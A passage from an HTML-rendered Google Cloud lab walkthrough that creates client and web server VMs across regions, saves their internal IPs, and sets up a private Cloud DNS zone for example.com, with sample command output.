style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Created [https://www.googleapis.com/compute/v1/projects/routing-policy-lab/zones/us-east1-b/instances/us-client-vm].</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NAME: us-client-vm</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ZONE: "Zone 1"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">MACHINE_TYPE: e2-micro</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">PREEMPTIBLE:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">INTERNAL_IP: 10.142.0.2</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">EXTERNAL_IP: 34.138.90.216</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">STATUS: RUNNING</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 203px;"></div><div class="CodeMirror-gutters" style="display: none; height: 203px;"></div></div></div></pre><h4 id='launch-a-client-in-europe'><span>Launch a client in Europe</span></h4><ul><li><p><span>Run the following to create the client VMs:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute instances create europe-client-vm --machine-type=e2-micro --zone ""Zone 2""</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><span>Note that you may see a different zone in gcloud than in the sample output shown below.</span></p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Created [https://www.googleapis.com/compute/v1/projects/routing-policy-lab/zones/europe-west2-a/instances/europe-client-vm].</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NAME: europe-client-vm</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ZONE: "Zone 2"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">MACHINE_TYPE: e2-micro</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">PREEMPTIBLE:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">INTERNAL_IP: 10.154.0.2</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">EXTERNAL_IP: 35.242.164.177</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">STATUS: RUNNING</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 203px;"></div><div class="CodeMirror-gutters" style="display: none; height: 203px;"></div></div></div></pre><h4 id='launch-a-client-in-asia'><span>Launch a client in Asia</span></h4><ol start='' ><li><p><span>Run the following to create the client VMs:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute instances create asia-client-vm --machine-type=e2-micro --zone ""Zone 3""</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><span>Note that you may see a different zone in gcloud than in the sample output shown below.</span></p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Created [https://www.googleapis.com/compute/v1/projects/routing-policy-lab/zones/asia-south1-a/instances/asia-client-vm].</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NAME: asia-client-vm</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ZONE: "Zone 3"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">MACHINE_TYPE: e2-micro</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">PREEMPTIBLE:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">INTERNAL_IP: 10.160.0.2</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">EXTERNAL_IP: 34.93.179.212</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">STATUS: RUNNING</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 203px;"></div><div class="CodeMirror-gutters" style="display: none; height: 203px;"></div></div></div></pre><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Launch client VMs</span></p><p>&nbsp;</p><h4 id='task-4-launch-server-vms'><span>Task 4. Launch Server VMs</span></h4><p><span>Now that the client VM&#39;s are up and running, the next step is to create the server VMs. You will use a startup script to configure and set up the web servers. As mentioned earlier, you will create the server VMs only in 2 regions: us-east1 and europe-west2.</span></p><ul><li><p><span>Run the </span><code>gcloud compute instances create</code><span> command to create the server VMs. The compute instance create command can take a few minutes to complete. Please wait for a &quot;Created&quot; message before moving to the next step.</span></p></li></ul><h4 id='launch-server-in-the-united-states'><span>Launch server in the United States</span></h4><ul><li><p><span>Run the following command:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute instances create us-web-vm \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--machine-type=e2-micro \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--zone="Zone 1" \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--network=default \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--subnet=default \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--tags=http-server \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--metadata=startup-script='#! /bin/bash</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> apt-get update</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> apt-get install apache2 -y</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> echo "Page served from: "Region 1"" | \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> tee /var/www/html/index.html</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> systemctl restart apache2'</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 270px;"></div><div class="CodeMirror-gutters" style="display: none; height: 270px;"></div></div></div></pre><p>&nbsp;</p><p><span>Note that you may see a different zone in gcloud than in the sample output shown below.</span></p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Created [https://www.googleapis.com/compute/v1/projects/routing-policy-lab/zones/us-east1-b/instances/us-web-vm].</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NAME: us-web-vm</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ZONE: "Zone 1"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">MACHINE_TYPE: e2-micro</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">PREEMPTIBLE:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">INTERNAL_IP: 10.142.0.3</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">EXTERNAL_IP: 34.73.110.151</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">STATUS: RUNNING</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 203px;"></div><div class="CodeMirror-gutters" style="display: none; height: 203px;"></div></div></div></pre><h4 id='launch-server-in-europe'><span>Launch server in Europe</span></h4><ul><li><p><span>Run the following to command:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute instances create europe-web-vm \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--machine-type=e2-micro \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--zone="Zone 2" \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--network=default \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--subnet=default \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--tags=http-server \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--metadata=startup-script='#! /bin/bash</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> apt-get update</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> apt-get install apache2 -y</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> echo "Page served from: "Zone 2"" | \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> tee /var/www/html/index.html</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> systemctl restart apache2'</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 270px;"></div><div class="CodeMirror-gutters" style="display: none; height: 270px;"></div></div></div></pre><p>&nbsp;</p><p><span>Note that you may see a different zone in gcloud than in the sample output shown below.</span></p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Created [https://www.googleapis.com/compute/v1/projects/routing-policy-lab/zones/europe-west2-a/instances/europe-web-vm].</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NAME: europe-web-vm</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ZONE: "Zone 2"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">MACHINE_TYPE: e2-micro</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">PREEMPTIBLE:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">INTERNAL_IP: 10.154.0.3</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">EXTERNAL_IP: 35.234.156.62</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">STATUS: RUNNING</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 203px;"></div><div class="CodeMirror-gutters" style="display: none; height: 203px;"></div></div></div></pre><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Launch Server VMs</span></p><p>&nbsp;</p><h4 id='task-5-setting-up-environment-variables'><span>Task 5. Setting up environment variables</span></h4><p><span>Before you configure Cloud DNS, note the Internal IP addresses of the web servers. You need these IPs to create the routing policy. In this section, you will use the </span><code>gcloud compute instances describe</code><span> command to save the internal IP addresses as environment variables.</span></p><ol start='' ><li><p><span>Command to save IP address for the VM in the United States</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">export US_WEB_IP=$(gcloud compute instances describe us-web-vm --zone="Zone 1" --format="value(networkInterfaces.networkIP)")</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p>&nbsp;</p><ol start='' ><li><p><span>Command to save the IP address for the VM in Europe:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">export EUROPE_WEB_IP=$(gcloud compute instances describe europe-web-vm --zone="Zone 2" --format="value(networkInterfaces.networkIP)")</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p>&nbsp;</p><h4 id='task-6-create-the-private-zone'><span>Task 6. Create the private zone</span></h4><p><span>Now that your client and server VMs are running, it&#39;s time to configure the DNS settings. Before creating the A records for the web servers, you need to create the Cloud DNS Private Zone.</span></p><p><span>For this lab, use the </span><code>example.com</code><span> domain name for the Cloud DNS zone.</span></p><ul><li><p><span>Use the </span><code>gcloud dns managed-zones create</code><span> command to create the zone:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud dns managed-zones create example --description=test --dns-name=example.com --networks=default --visibility=private</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p>&nbsp;</p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span 